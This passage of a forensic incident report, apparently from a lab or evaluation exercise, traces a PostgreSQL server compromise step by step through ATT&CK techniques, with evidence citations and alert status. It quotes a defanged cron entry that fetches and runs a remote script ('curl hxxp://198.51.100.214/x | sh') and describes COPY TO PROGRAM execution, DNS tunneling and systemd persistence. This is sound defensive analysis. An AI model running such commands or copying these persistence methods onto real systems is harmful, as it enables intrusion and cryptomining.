ust` access to all remote IP addresses (`0.0.0.0/0`) for the PostgreSQL superuser (`/disk/var/lib/pgsql/data/pg_hba.conf:3`). Concurrently, SSH brute force attacks were conducted from `198.51.100.214` (`/disk/var/log/secure:155`), resulting in successful authentication as `root` (`/disk/var/log/secure:214`).\n- **Alert Status**: PARTIAL. Database configuration noted in `/sas/alerts.json:18` (ALERT-03 / CHK-06); SSH password brute force and successful root login were SILENT.\n- **Evidence Citation**: `/disk/var/lib/pgsql/data/pg_hba.conf:3`, `/disk/var/log/secure:214`, `/sas/cti/advisory.txt:12`.\n\n### Step 2: Execution via Unix Shell & COPY TO PROGRAM (T1059.004)\n- **Description**: Leveraging PostgreSQL superuser privileges, the actor issued SQL commands utilizing `COPY ... TO PROGRAM` (`/sas/cti/advisory.txt:13`) to execute shell commands as the `postgres` system user. This dropped the binary executable payload `/var/lib/pgsql/.local/pgdaemon` (`/disk/var/lib/pgsql/.local/pgdaemon:1`).\n- **Alert Status**: ALERTED in `/sas/alerts.json:1` (ALERT-01 / CHK-01).\n- **Evidence Citation**: `/disk/var/lib/pgsql/.local/pgdaemon:1`, `/sas/alerts.json:1`, `/sas/cti/advisory.txt:13`.\n\n### Step 3: Exfiltration Over Unencrypted Non-C2 Protocol / DNS Tunneling (T1048.003)\n- **Description**: The actor dropped a C2 and DNS tunneling configuration file at `/etc/pgdaemon.conf` (`/disk/etc/pgdaemon.conf:1-3`). The configuration routes exfiltrated database telemetry and local system data over DNS queries directed to `update-postgres.example.cn` (`/disk/etc/pgdaemon.conf:3`). Evidence of active beaconing was also recovered from wiped cache fragments (`/disk/var/lib/.cache/.wiped.bin:1`).\n- **Alert Status**: SILENT (Not present in SAS alerts feed).\n- **Evidence Citation**: `/disk/etc/pgdaemon.conf:3`, `/disk/var/lib/.cache/.wiped.bin:1`, `/sas/cti/advisory.txt:14`.\n\n### Step 4: Execution & Persistence via Cron (T1053.003)\n- **Description**: The actor established cron persistence in the user cron table `/var/spool/cron/postgres` (`/disk/var/spool/cron/postgres:5`). The job runs a shell script execution payload (`* * * * * root <defanged beacon: curl hxxp://198.51.100.214/x | sh>`) designed to repeatedly fetch and re-drop cryptocurrency miner and daemon payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).\n- **Alert Status**: ALERTED in `/sas/alerts.json:10` (ALERT-02 / CHK-02).\n- **Evidence Citation**: `/disk/var/spool/cron/postgres:5`, `/sas/alerts.json:10`, `/sas/cti/advisory.txt:15`.\n\n### Step 5: Systemd Service Persistence (T1543.002)\n- **Description**: The actor created a malicious systemd service unit file at `/etc/systemd/system/pg-metrics.service` (`/disk/etc/systemd/system/pg-metrics.service:1-7`) under the deceptive description `System Update Helper`. The unit executes an `ExecStart` command that re-launches `/var/lib/pgsql/.local/pgdaemon` upon boot and network activation.\n- **Note on Legitimate Job**: `/etc/systemd/system/pg-backup.service` (`/disk/etc/systemd/system/pg-backup.service:1-3`) was analyzed and confirmed to be a legitimate, approved operational backup job (`/usr/local/bin/backup.sh --remote 10.10.31`).\n- **Alert Status**: SILENT (Not present in SAS alerts feed).\n- **Evidence Citation**: `/disk/etc/systemd/system/pg-metrics.service:5`, `/disk/etc/systemd/system/pg-backup.service:1`, `/sas/cti/advisory.txt:16`.\n\n### Step 6: Anti-Forensics & Timestomping (T1070.006)\n- **Description**: The actor performed timestomping on dropped files under `/var/lib/pgsql/.local/` to backdate file modification times (`mtime`) to match standard system binaries such as `/bin/ls` (`/disk/var/lib/pgsql/.local/.timestamps:2`). Furthermore, log files and credential cache files were wiped or truncated (`/disk/var/lib/.cache/.wiped.bin:1`).\n- **Alert Status**: SILENT (Not present in SAS alerts feed).\n- **Evidence Citation**: `/disk/var/lib/pgsql/.local/.timestamps:2`, `/disk/var/lib/.cache/.wiped.bin:1`, `/sas/cti/advisory.txt